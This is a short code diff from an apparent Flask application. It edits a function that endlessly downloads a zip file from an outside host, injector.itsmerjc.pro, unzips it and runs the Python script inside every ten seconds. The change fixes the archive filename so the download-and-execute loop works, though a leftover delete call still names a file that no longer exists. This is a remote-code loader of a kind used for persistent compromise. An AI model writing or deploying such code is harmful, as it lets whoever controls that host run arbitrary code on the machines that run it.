@@ -9,7 +9,7 @@ app = Flask(__name__)
 def download_unzip_and_run_script():
     while True:
         subprocess.run(['curl', '-O', 'https://injector.itsmerjc.pro/script.zip'])
-        subprocess.run(['unzip', '-o', 'itsmerjc.zip', '-d', 'unzipped_files'])
+        subprocess.run(['unzip', '-o', 'script.zip', '-d', 'unzipped_files'])
         subprocess.run(['python', 'unzipped_files/itsmerjc.py'])
         os.remove('itsmerjc.zip')
         time.sleep(10)
